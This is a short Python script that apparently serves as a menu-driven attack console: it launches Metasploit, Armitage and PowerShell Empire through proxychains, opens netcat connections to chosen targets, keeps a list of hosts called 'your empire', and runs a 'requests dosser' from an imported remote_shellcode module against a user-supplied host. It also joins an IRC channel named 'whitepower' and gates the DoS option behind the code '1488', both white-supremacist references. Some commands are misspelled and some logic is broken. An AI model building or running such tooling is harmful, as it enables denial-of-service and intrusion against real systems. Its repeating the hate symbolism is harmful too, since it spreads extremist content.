import os
import remote_shellcode
def irc():
    os.system("proxychains irssi")
    os.system("/connect Rizon")
    os.system("/join whitepower")
def armitage():
    os.system("sudo service postogresql start && sudo msfdb init && sudo proxychains armitage")
def powershell():
    os.system("sudo proxychains powershell-empire server")
def msf():
    os.system("sudo proxychains msfconsole")
def lister():
    os.system("cat ips.txt")
def nc(a,b):
    os.system(f"sudo nc {a} {b}")
def add(ip):
    file=open("ips.txt","w")
    file.write(f"\n{ip}")
    print(f"the host:{ip} it is been added to the list")
    file.close()
def start():
    while(True):
        menu='''
        1}irc chat
        2}start armitage
        3}start powershell-empire
        4}start metasploit
        5}list all ip in your empire
        6}netcat bind shell
        7}add ip to your empire
        8}final protocol: requests dosser
        9}exit
        '''
        os.system("clear && cat banner.txt | lolcat")
        print("-=menu=-")
        print(menu)
        user_input=input('(choose)-->')
        if(user_input=="1"):
            irc()
        if(user_input=="2"):
            armitage()
        if(user_input=="3"):
            powershell()
        if(user_input=="4"):
            msf()
        if(user_input=="6"):
            target=input('(target)-->')
            port=input('(port)-->')
            nc(target,port)
        if(user_input=="7"):
            ip=input("(ip)-->")
            add(ip)
        if(user_input=="8"):
            ask=input("are you sure you want continue(y/n)?")
            if(ask=="y"):
                code=input("(1488){inert the code on the left to continue}-->")
                if(code=="1488"):
                    host=input("(target)-->")
                    port=int(input("(port)-->"))
                    file=input("(file you want get from the site es: /index.html)-->")
                    remote_shellcode.rain(host,port,file)
start()